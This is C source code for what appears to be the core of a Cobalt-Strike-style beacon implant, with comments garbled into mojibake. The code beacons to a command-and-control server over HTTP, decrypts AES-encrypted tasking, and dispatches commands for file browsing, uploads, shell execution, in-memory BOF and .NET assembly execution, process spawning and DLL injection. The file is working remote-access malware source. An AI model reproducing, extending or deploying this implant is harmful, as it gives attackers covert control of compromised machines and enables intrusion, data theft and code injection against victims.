#include <shobjidl.h>
#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#pragma warning(disable:4996)
#include "Config.h"
#include "Command.h"
#include "Job.h"
#include <tlhelp32.h>
#include <tchar.h>

// ��������
extern int SleepTime;
extern unsigned char aeskey[16];

#define MAX_PACKET 524288

VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen);

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* cookie_header = makeMetaData();
    if (cookie_header == NULL) {
        fprintf(stderr, "construct metadata failed\n");
        return;
    }
    while (1) {
        // ����������ͬʱ����ȡ��Ӧ����
        size_t responseSize = 0;
		// ���� Job �б�
        ProcessJobEntry(MAX_PACKET);
        unsigned char* responseEncodeData = GET(cookie_header, &responseSize);
        // �����һ���ֽ�Ϊ�˷�\0����Ȼ���� strlen �ĳ��Ⱥ� responseSize �Բ���
        // responseSize > 7 ==> responseSize >= Prefix + Suffix
        if (responseEncodeData && responseSize > 7) {
            unsigned char* tmp = realloc(responseEncodeData, responseSize + 1);
            if (tmp) {
                responseEncodeData = tmp;
                responseEncodeData[responseSize] = '\0';
            }
            else {
                free(responseEncodeData);
                responseEncodeData = NULL;
                continue;
            }
        }

        size_t responseDataLength = 0;

        // �����������Ҫ����һ�� NetBios ���룬һ�� XOR ���ܶ�Ӧ Mask����Ϊ profile ����д��
        unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);
        // ����Ÿ�\0����Ȼ���� strlen ����ִ���

        // ȷ��Ϊ 16 �ı��������� AES ����
        if (responseData && responseDataLength > 16 && responseDataLength % 16 == 0) {
            size_t ciperTextLength = responseDataLength - 16;
            unsigned char* ciperText = responseData;

            // ��ʼ����ָ��(AES CBC)
            unsigned char* key = aeskey;
            size_t cbclength;
            unsigned char* cbcdata = AesCBCDecrypt(ciperText, key, ciperTextLength, &cbclength);

            if (cbcdata != NULL) {
                datap parser;
                BeaconDataParse(&parser, cbcdata, cbclength);
                // ��֪����ʲô
                BeaconDataInt(&parser);
                // ���ĸ��ֽ�������ָ���ܳ���
                /* ָ�����ݣ����ж���ָ�����ʱ�ṹ����
                 *  ָ�����ݰ���ʽ��?(4Bytes) |totalLength (4Bytes)| cmdType(4Bytes) | commandLen(4Bytes)
                 *  | commandBuf(commandLen Bytes) || cmdType(4Bytes) | commandLen(4Bytes) | commandBuf(4Bytes) || ...
                 */
                uint32_t totalLength = (uint32_t)BeaconDataInt(&parser);
                unsigned char* totalBuffer = BeaconDataPtr(&parser, totalLength);
                
                // ָ�����ݴ�С����
                size_t count = 0;

                while (totalLength > 0) {
                    int callbackType = 0;
                    uint32_t commandType = 0;
                    size_t commandBuflen = 0;
                    unsigned char* commandBuf = NULL;

                    commandBuf = parsePacket(totalBuffer, &totalLength, &commandType, &commandBuflen, &count);

                    if (commandBuf) {
                        executeCommand(commandBuf, commandType, commandBuflen);
                    }
                    else {
                        fprintf(stderr, "commandBuf parse error\n");
                        break;
                    }
                }
                free(cbcdata);
                cbcdata = NULL;
            }
        }
    SLEEP_NEXT:
        if (responseEncodeData) { free(responseEncodeData); responseEncodeData = NULL; }
        Sleep(SleepTime);
    }
    free(cookie_header);
}

int main() {
    beacon_main();
    return 0;
}

 VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
    unsigned char* postMsg = NULL;           // �˲������� DataProcess
    size_t msgLength = 0;           // �˲������� DataProcess
    int callbackType = 0;           // �˲������� DataProcess ����ʹ�� DWORD ��ʾ �����з��� 

    switch (commandType)
    {
    case CMD_TYPE_SLEEP:
        callbackType = -1;
        CmdChangSleepTimes(commandBuf, commandBuflen);
        break;
    case CMD_TYPE_FILE_BROWSE:   
        callbackType = CALLBACK_PENDING;
        postMsg = CmdFileBrowse(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_UPLOAD_START:  
        // ����ļ��Ѵ��ڣ������ԭ�����ݣ��ļ����ȱ�Ϊ 0��
        // ����ļ������ڣ����½��ļ�
        // д��ʱ���ļ���ͷ��ʼд
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdUpload(commandBuf, commandBuflen, &msgLength, "wb");
        break;
    case CMD_TYPE_UPLOAD_LOOP: 
        // ����ļ��Ѵ��ڣ�д���λ����Զ���ļ�ĩβ�����Ḳ��ǰ�������
        // ����ļ������ڣ����½��ļ�
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdUpload(commandBuf, commandBuflen, &msgLength, "ab");
        break;
    case  CMD_TYPE_DRIVES:       
        callbackType = CALLBACK_PENDING;
        postMsg = CmdDrives(commandBuf, commandBuflen, &msgLength);
        break;
    case  CMD_TYPE_MKDIR:        
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdMkdir(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_PWD:           
        callbackType = CALLBACK_PWD;
        postMsg = CmdPwd(&msgLength);
        break;
    case CMD_TYPE_CD:
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdCd(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_GETUID:        
        callbackType = CALLBACK_TOKEN_GETUID;
        postMsg = CmdGetUid(&msgLength);
        break;
    case CMD_TYPE_SETENV:        
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdSetEnv(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_RM:            
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdFileRemove(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_GET_PRIVS:              
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdGetPrivs(&msgLength);
        break;
    case CMD_TYPE_CP:            
		callbackType = CALLBACK_OUTPUT;
		postMsg = CmdFileCopy(commandBuf, commandBuflen, &msgLength);
		break;
    case CMD_TYPE_MV:            
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdFileMove(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_DOWNLOAD:                                    
        callbackType = -1;
        CmdFileDownload(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_SHELL:         
        callbackType = -1;
        /*
         * ��Ϊ CmdShell �лᴴ���̣߳��߳��л�ʹ�� commanfBuf
         * �߳̽�������Զ��ͷ� commanfBuf
         * �����ǰ�ͷ� commanfBuf �ᵼ���̷߳������ͷ��ڴ�
        */
        CmdShell(commandBuf, commandBuflen);
        break;
    case CMD_TYPE_BOF:   
        callbackType = -1;
        CmdInlineExecute(commandBuf, commandBuflen);
        break;
    case CMD_TYPE_EXIT:  
        exit(-1);
    case CMD_TYPE_PS:    
        callbackType = -1;
        CmdPs(commandBuf, commandBuflen);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = -1;
        CmdSpawn(commandBuf, commandBuflen, FALSE, TRUE);
		break;
    case CMD_TYPE_JOB_REGISTER_MSGMODE:
        callbackType = -1;
        CmdJobRegister(commandBuf, commandBuflen, FALSE, TRUE);
        break;
    case CMD_TYPE_INJECT_X64:
        callbackType = -1;
        CmdDllInejct(commandBuf, commandBuflen, FALSE);
        break;
    case CMD_TYPE_INJECT_X86:
        callbackType = -1;
        CmdDllInejct(commandBuf, commandBuflen, TRUE);
		break;
    case CMD_TYPE_JOBS:       
        callbackType = CALLBACK_JOBS;
        postMsg = CmdJobList(&msgLength);
        break;
    case CMD_TYPE_JOBS_KILL:  
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdJobKill(commandBuf, commandBuflen, &msgLength);
        break;
    case CMD_TYPE_EXECUTE_ASSEMBLY_X64:  
        callbackType = -1;
        CmdExecuteAssembly(commandBuf, commandBuflen);
		break;
    default:
        callbackType = CALLBACK_OUTPUT;
        unsigned char* result = "[-] This Command Do Not Accomplish";
        unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
        if (!resultMemmory) {
            fprintf(stderr, "Memory allocation failed for resultMemmory\n");
            return;
        }
        memcpy(resultMemmory, result, strlen(result));
        postMsg = resultMemmory;
        msgLength = strlen(result);
		postMsg[msgLength] = '\0';
        break;
    }

    if (callbackType >= 0 && postMsg) {
        DataProcess(postMsg, msgLength, callbackType);
        free(postMsg);
    }
}
